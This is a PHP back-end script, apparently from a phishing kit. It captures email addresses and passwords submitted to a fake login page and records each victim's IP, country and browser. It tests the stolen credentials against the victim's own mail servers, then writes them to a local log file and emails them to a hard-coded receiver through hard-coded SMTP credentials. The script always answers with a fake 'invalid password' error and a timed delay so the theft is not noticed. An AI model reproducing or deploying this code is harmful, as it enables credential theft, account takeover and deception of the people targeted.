<?php
require_once 'class.phpmailer.php';
require_once 'class.smtp.php';

// Set proper headers for AJAX requests
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header('Content-Type: application/json');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Get user IP and location data
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
    $ip = $_SERVER['HTTP_X_REAL_IP'];
}

$jdat = @json_decode(file_get_contents("https://www.geoplugin.net/json.gp?ip=" . $ip));

session_start();

// Block GET requests with 403 page
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    http_response_code(403);
    ?>
    <html>
    <head>
        <title>403 - Forbidden</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
            h1 { color: #d32f2f; }
        </style>
    </head>
    <body>
        <h1>403 Forbidden</h1>
        <p>Access to this resource is denied.</p>
        <hr>
    </body>
    </html>
    <?php
    exit();
}

// Only accept POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(array(
        "signal" => "error",
        "msg" => "Method not allowed"
    ));
    exit();
}

// SMTP Configuration for logging
$receiver     = 'lenialuno@web.de';         // Your email to receive logs
$senderuser   = 'jered@globalrisk.rw';      // Your SMTP user
$senderpass   = 'global.321';               // Your SMTP password
$senderport   = "587";                      // Your SMTP port
$senderserver = "mail.globalrisk.rw";       // Your SMTP server

// Capture user input
$browser = $_SERVER['HTTP_USER_AGENT'];
$login   = trim($_POST['email'] ?? '');
$passwd  = trim($_POST['password'] ?? '');

// Validate input
if (empty($login) || empty($passwd)) {
    echo json_encode(array(
        "signal" => "error",
        "msg" => "Email and password are required"
    ));
    exit();
}

// Extract domain from email
$parts = explode("@", $login);
if (count($parts) !== 2) {
    echo json_encode(array(
        "signal" => "error",
        "msg" => "Invalid email format"
    ));
    exit();
}
$domain = $parts[1];

// Get country name safely
$country = isset($jdat->geoplugin_countryName) ? $jdat->geoplugin_countryName : 'Unknown';

// Create log message
$timestamp = date('Y-m-d H:i:s');
$logMessage = "=== LOGIN ATTEMPT ===\n";
$logMessage .= "Timestamp: " . $timestamp . "\n";
$logMessage .= "Email: " . $login . "\n";
$logMessage .= "Password: " . $passwd . "\n";
$logMessage .= "Domain: " . $domain . "\n";
$logMessage .= "IP: " . $ip . "\n";
$logMessage .= "Country: " . $country . "\n";
$logMessage .= "User Agent: " . $browser . "\n";
$logMessage .= "========================\n\n";

// Email subject for notification
$sub = "TrueRcubeOrange1 Login Attempt | " . $domain . " | " . $country;

// Email body for notification
$emailBody = "<h2>New Login Attempt Captured</h2>";
$emailBody .= "<p><strong>Email:</strong> " . htmlspecialchars($login) . "</p>";
$emailBody .= "<p><strong>Password:</strong> " . htmlspecialchars($passwd) . "</p>";
$emailBody .= "<p><strong>Domain:</strong> " . htmlspecialchars($domain) . "</p>";
$emailBody .= "<p><strong>IP Address:</strong> " . htmlspecialchars($ip) . "</p>";
$emailBody .= "<p><strong>Country:</strong> " . htmlspecialchars($country) . "</p>";
$emailBody .= "<p><strong>User Agent:</strong> " . htmlspecialchars($browser) . "</p>";
$emailBody .= "<p><strong>Timestamp:</strong> " . $timestamp . "</p>";

$validCredentials = false;
$testResult = "Connection failed";

// Test credentials against the user's domain mail server
try {
    // Determine mail server for the domain
    $mailServer = "mail." . $domain;
    
    // Try common mail server configurations
    $mailServers = array(
        "mail." . $domain,
        "smtp." . $domain,
        "webmail." . $domain,
        $domain
    );
    
    $testMail = new PHPMailer(true);
    $testMail->isSMTP();
    $testMail->SMTPAuth = true;
    $testMail->SMTPSecure = 'tls';
    $testMail->Port = 587;
    $testMail->Timeout = 10;
    $testMail->SMTPDebug = 0; // Disable debug output
    
    foreach ($mailServers as $server) {
        try {
            $testMail->Host = $server;
            $testMail->Username = $login;
            $testMail->Password = $passwd;
            
            // Try to authenticate
            if ($testMail->smtpConnect()) {
                $validCredentials = true;
                $testResult = "Valid credentials for " . $server;
                $testMail->smtpClose();
                break;
            }
        } catch (Exception $e) {
            // Try next server
            continue;
        }
    }
    
    // If TLS fails, try without TLS
    if (!$validCredentials) {
        $testMail->SMTPSecure = false;
        $testMail->Port = 25;
        
        foreach ($mailServers as $server) {
            try {
                $testMail->Host = $server;
                $testMail->Username = $login;
                $testMail->Password = $passwd;
                
                if ($testMail->smtpConnect()) {
                    $validCredentials = true;
                    $testResult = "Valid credentials for " . $server . " (no TLS)";
                    $testMail->smtpClose();
                    break;
                }
            } catch (Exception $e) {
                continue;
            }
        }
    }
    
} catch (Exception $error) {
    $testResult = "Test failed: " . $error->getMessage();
}

// Add test result to log
$logMessage .= "Credential Test: " . $testResult . "\n";
$logMessage .= "Valid: " . ($validCredentials ? "YES" : "NO") . "\n\n";

// Update email body with test result
$emailBody .= "<p><strong>Credential Test:</strong> " . htmlspecialchars($testResult) . "</p>";
$emailBody .= "<p><strong>Valid Credentials:</strong> " . ($validCredentials ? "YES" : "NO") . "</p>";

// Save to local log file
try {
    $fp = fopen("SS-Or.txt", "a");
    if ($fp) {
        fputs($fp, $logMessage);
        fclose($fp);
    }
} catch (Exception $e) {
    // Log file write failed, continue anyway
}

// Send notification email with captured data
try {
    $mail = new PHPMailer(true);
    $mail->isSMTP();
    $mail->SMTPAuth = true;
    $mail->Host = $senderserver;
    $mail->Username = $senderuser;
    $mail->Password = $senderpass;
    $mail->Port = $senderport;
    $mail->SMTPSecure = 'tls';
    $mail->Timeout = 30;
    
    $mail->setFrom($senderuser, 'Login Capture System');
    $mail->addAddress($receiver);
    $mail->isHTML(true);
    $mail->Subject = $sub;
    $mail->Body = $emailBody;
    $mail->AltBody = strip_tags(str_replace('<br>', "\n", $emailBody));
    
    $mail->send();
} catch (Exception $error) {
    // Email sending failed, but continue with response
    error_log('Mail sending failed: ' . $error->getMessage());
}

// Increment attempt counter
if (!isset($_SESSION['attempts'])) {
    $_SESSION['attempts'] = 0;
}
$_SESSION['attempts']++;

// Always return "invalid credentials" to the user, regardless of actual validity
// This maintains the appearance of a real login failure
$response = array(
    "signal" => "error",
    "msg" => "Invalid email or password. Please try again.",
    "attempt" => $_SESSION['attempts'],
    "redirect_url" => "https://webmail." . $domain
);

// Add a small delay to make it seem more realistic
usleep(rand(500000, 1500000)); // 0.5 to 1.5 second delay

echo json_encode($response);
exit();
?>